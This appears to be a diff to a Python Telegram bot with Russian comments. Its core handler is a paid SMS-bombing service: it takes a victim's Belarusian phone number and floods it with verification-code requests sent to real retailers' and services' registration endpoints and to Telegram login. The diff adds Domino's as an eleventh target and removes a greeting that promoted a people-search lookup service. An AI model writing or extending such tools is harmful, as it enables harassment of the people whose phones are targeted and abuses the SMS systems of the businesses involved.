@@ -404,15 +404,6 @@ async def start(message: Message):
             reply_markup=start_mes
     )
 
-    # Приветственное сообщение
-    await message.answer_photo(
-        photo='https://avatars.mds.yandex.net/i?id=026e7b7cf40d328b163e1db7cab9bed337c2b49e-5682063-images-thumbs&n=13',
-        caption=f"Привет, детектив {message.from_user.first_name}! 🕵️‍♂️ Готов к расследованию? Отправляй мне любую зацепку: номер, никнейм, фото или ссылку. Я помогу найти то, что скрыто в цифровой тени. Вместе мы раскроем любое дело! 🔍✨ Включай логику и давай начинать. Жду твою первую задачу!\n🔀 Вот ссылка на сервис: <a href='https://spravochnik109.link/byelarus/vityebskaya-oblast/'>Ссылка</a>\n<b>Вот ссылка на бот</b>: https://t.me/sherlocks_find_bot",
-        parse_mode='HTML',
-        reply_markup=start_mes
-    )
-
-
 
 
 @router.message(F.content_type == ContentType.USERS_SHARED)
@@ -599,26 +590,18 @@ async def bomber_phone_start(message: Message, state: FSMContext):
     # ============ ПРОВЕРКА КОЛИЧЕСТВА ЗАПРОСОВ ИЗ БД ============
     db = SessionLocal()
     try:
-        # Получаем пользователя из БД
         user = db.query(User).filter(User.telegram_id == str(message.from_user.id)).first()
-
         if not user:
             await message.answer("❌ Пользователь не найден в базе данных!")
             await state.clear()
             return
-
-        # Проверяем количество доступных запросов
         if user.queries < 1:
             await message.answer("❌ У вас закончились запросы! Пополните баланс.")
             await state.clear()
             return
-
-        # Забираем один запрос (уменьшаем на 1)
         user.queries = user.queries - 1
         db.commit()
-
         await message.answer(f"✅ Запрос выполняется. Осталось запросов: {user.queries}")
-
     except Exception as e:
         print(f"Ошибка БД: {e}")
         await message.answer("❌ Ошибка при проверке баланса")
@@ -628,28 +611,22 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         db.close()
 
     # ============ ОЧИСТКА НОМЕРА ТЕЛЕФОНА ============
-    telephone_raw = message.text.strip().replace('+', '').replace(' ', '').replace('-', '').replace('(', '').replace(
-        ')', '')
-
+    telephone_raw = message.text.strip().replace('+', '').replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
     try:
         phone_number = phonenumbers.parse(telephone_raw, "BY")
-
         if phonenumbers.is_valid_number(phone_number):
             formatted_telephone = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.E164)
             telephone_clean = formatted_telephone.replace('+', '')
-
         else:
             await message.answer("❌ Неверный формат номера телефона. Введите номер в формате +375XXXXXXXXX")
             await state.clear()
             return
-
     except phonenumbers.NumberParseException:
         await message.answer("❌ Неверный формат номера телефона. Введите номер в формате +375XXXXXXXXX")
         await state.clear()
         return
 
     # ============ ДИНАМИЧЕСКОЕ ПОЛУЧЕНИЕ ПАРАМЕТРОВ ============
-
     fingerprint = str(uuid.uuid4())
     sessid = get_oma_sessid()
     megatop_code = get_megatop_code()
@@ -664,13 +641,13 @@ async def bomber_phone_start(message: Message, state: FSMContext):
     url_21vek = "https://gate.21vek.by/account/users/register/send-confirmation"
     url_invitro = "https://lk3.invitro.by/site/api/login-confirmation/send-login-code"
     url_winline = "https://winline.by/api/blr/registration/send-sms-code"
+    url_dominos = "https://dominos.by/api/v1/auth/login/phone/"
 
     # ============ ЗАГОЛОВКИ ============
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Accept': 'application/json, text/plain, */*'
     }
-
     headers_ziko = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Content-Type': 'application/json',
@@ -678,14 +655,12 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         'fingerprint': fingerprint,
         'X-Fingerprint': fingerprint
     }
-
     headers_oma = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Content-Type': 'application/x-www-form-urlencoded',
         'X-Requested-With': 'XMLHttpRequest',
         'Referer': 'https://www.oma.by/personal/user/login.php'
     }
-
     headers_oz = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Content-Type': 'application/json',
@@ -693,7 +668,6 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         'Origin': 'https://oz.by',
         'Referer': 'https://oz.by/'
     }
-
     headers_megatop = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Content-Type': 'application/json',
@@ -701,7 +675,6 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         'Origin': 'https://megatop.by',
         'Referer': 'https://megatop.by/'
     }
-
     headers_21vek = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Content-Type': 'application/json',
@@ -709,7 +682,6 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         'Origin': 'https://21vek.by',
         'Referer': 'https://21vek.by/'
     }
-
     headers_invitro = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Content-Type': 'application/json',
@@ -717,7 +689,6 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         'Origin': 'https://lk3.invitro.by',
         'Referer': 'https://lk3.invitro.by/'
     }
-
     headers_winline = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Content-Type': 'application/json',
@@ -725,22 +696,22 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         'Origin': 'https://winline.by',
         'Referer': 'https://winline.by/'
     }
+    headers_dominos = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'Origin': 'https://dominos.by',
+        'Referer': 'https://dominos.by/'
+    }
 
     # ============ ДАННЫЕ ДЛЯ ЗАПРОСОВ ============
-
-    # 1. AMD
     data_amd = {
         'telephone': telephone_clean.replace("375", "")
     }
-
-    # 2. Ziko
     data_ziko = {
         'phoneNumber': f"+{telephone_clean}"
     }
-
-    # 3. OMA.BY (формат: +375 (44) 538-94-24)
     phone_for_oma = f"+{telephone_clean[:3]} ({telephone_clean[3:5]}) {telephone_clean[5:8]}-{telephone_clean[8:10]}-{telephone_clean[10:12]}"
-
     data_oma = {
         'bxajaxid': 'e267e80e024f89cbb3544131bc06b8c0',
         'AJAX_CALL': 'Y',
@@ -750,54 +721,45 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         'UF_SOGL_USER': 'Y',
         'SET_REGISTER': 'Y'
     }
-
-    # 4. OZ.BY
     data_oz = {
         'phone': telephone_clean
     }
-
-    # 5. Megatop
     data_megatop = {
         'phone': telephone_clean,
         'code': megatop_code,
         'registration': True
     }
-
-    # 6. 21VEK
     phone_for_21vek = f"+{telephone_clean[:3]} ({telephone_clean[3:5]}) {telephone_clean[5:]}"
-
     data_21vek = {
         'email': fake.email(),
         'phone': phone_for_21vek,
         'name': fake.first_name()
     }
-
-    # 7. INVITRO
     data_invitro = {
         'login': f"+{telephone_clean}",
         'territory': "BELARUS",
         'captcha': None,
         'type': "LOGIN"
     }
-
-    # 8. WINLINE
     data_winline = {
         'phone': f"+{telephone_clean}",
         'languageCode': "ru"
     }
+    # Форматируем номер для Domino's: +375 445 38 9424
+    phone_for_dominos = f"+{telephone_clean[:3]} {telephone_clean[3:6]} {telephone_clean[6:8]} {telephone_clean[8:12]}"
+    data_dominos = {
+        'phone': phone_for_dominos
+    }
 
     # ============ ОТПРАВКА ЗАПРОСОВ ============
-
     await message.answer("🔄 Отправка запросов на сайты...")
-
     results = []
 
     try:
         # 1. 5element
         try:
             response_5element = requests.get(url_5element, headers=headers, timeout=10)
-            results.append("✅ 5element" if response_5element.status_code in [200,
-                                                                             202] else f"❌ 5element ({response_5element.status_code})")
+            results.append("✅ 5element" if response_5element.status_code in [200, 202] else f"❌ 5element ({response_5element.status_code})")
         except:
             results.append("❌ 5element (ошибка)")
 
@@ -811,60 +773,63 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         # 3. Ziko
         try:
             response_ziko = requests.post(url_ziko, headers=headers_ziko, json=data_ziko, timeout=10)
-            results.append(
-                "✅ Ziko" if response_ziko.status_code in [200, 202] else f"❌ Ziko ({response_ziko.status_code})")
+            results.append("✅ Ziko" if response_ziko.status_code in [200, 202] else f"❌ Ziko ({response_ziko.status_code})")
         except:
             results.append("❌ Ziko (ошибка)")
 
         # 4. OMA.BY
         try:
             response_oma = requests.post(url_oma, headers=headers_oma, data=data_oma, timeout=10)
-            results.append(
-                "✅ OMA.BY" if response_oma.status_code in [200, 202] else f"❌ OMA.BY ({response_oma.status_code})")
+            results.append("✅ OMA.BY" if response_oma.status_code in [200, 202] else f"❌ OMA.BY ({response_oma.status_code})")
         except:
             results.append("❌ OMA.BY (ошибка)")
 
         # 5. OZ.BY
         try:
             response_oz = requests.post(url_oz, headers=headers_oz, json=data_oz, timeout=10)
-            results.append(
-                "✅ OZ.BY" if response_oz.status_code in [200, 201, 202] else f"❌ OZ.BY ({response_oz.status_code})")
+            results.append("✅ OZ.BY" if response_oz.status_code in [200, 201, 202] else f"❌ OZ.BY ({response_oz.status_code})")
         except:
             results.append("❌ OZ.BY (ошибка)")
 
         # 6. Megatop
         try:
             response_megatop = requests.post(url_megatop, headers=headers_megatop, json=data_megatop, timeout=10)
-            results.append("✅ Megatop" if response_megatop.status_code in [200, 201,
-                                                                           202] else f"❌ Megatop ({response_megatop.status_code})")
+            results.append("✅ Megatop" if response_megatop.status_code in [200, 201, 202] else f"❌ Megatop ({response_megatop.status_code})")
         except:
             results.append("❌ Megatop (ошибка)")
 
         # 7. 21VEK
         try:
             response_21vek = requests.post(url_21vek, headers=headers_21vek, json=data_21vek, timeout=10)
-            results.append("✅ 21VEK" if response_21vek.status_code in [200, 201, 202,
-                                                                       204] else f"❌ 21VEK ({response_21vek.status_code})")
+            results.append("✅ 21VEK" if response_21vek.status_code in [200, 201, 202, 204] else f"❌ 21VEK ({response_21vek.status_code})")
         except:
             results.append("❌ 21VEK (ошибка)")
 
         # 8. INVITRO
         try:
             response_invitro = requests.post(url_invitro, headers=headers_invitro, json=data_invitro, timeout=10)
-            results.append("✅ INVITRO" if response_invitro.status_code in [200, 201, 202,
-                                                                           204] else f"❌ INVITRO ({response_invitro.status_code})")
+            results.append("✅ INVITRO" if response_invitro.status_code in [200, 201, 202, 204] else f"❌ INVITRO ({response_invitro.status_code})")
         except:
             results.append("❌ INVITRO (ошибка)")
 
         # 9. WINLINE
         try:
             response_winline = requests.post(url_winline, headers=headers_winline, json=data_winline, timeout=10)
-            results.append("✅ WINLINE" if response_winline.status_code in [200, 201, 202,
-                                                                           204] else f"❌ WINLINE ({response_winline.status_code})")
+            results.append("✅ WINLINE" if response_winline.status_code in [200, 201, 202, 204] else f"❌ WINLINE ({response_winline.status_code})")
         except:
             results.append("❌ WINLINE (ошибка)")
 
-        # 10. TELEGRAM
+        # 10. DOMINOS
+        try:
+            response_dominos = requests.post(url_dominos, headers=headers_dominos, json=data_dominos, timeout=10)
+            if response_dominos.status_code in [200, 201, 202, 204]:
+                results.append("✅ DOMINOS")
+            else:
+                results.append(f"❌ DOMINOS ({response_dominos.status_code})")
+        except:
+            results.append("❌ DOMINOS (ошибка)")
+
+        # 11. TELEGRAM
         try:
             telegram_success, _ = await send_telegram_code(telephone_clean)
             results.append("✅ TELEGRAM" if telegram_success else "❌ TELEGRAM (ошибка)")
@@ -881,8 +846,7 @@ async def bomber_phone_start(message: Message, state: FSMContext):
         db2.close()
 
         # Формируем ответ
-        answer_text = f"📱 **Результаты СМС-бомбинга**\n\n" + "\n".join(
-            results) + f"\n\n✅ Успешно: {success_count}/10\n📊 Осталось запросов: {remaining_queries}"
+        answer_text = f"📱 **Результаты СМС-бомбинга**\n\n" + "\n".join(results) + f"\n\n✅ Успешно: {success_count}/11\n📊 Осталось запросов: {remaining_queries}"
         await message.answer(answer_text)
 
     except Exception as e:
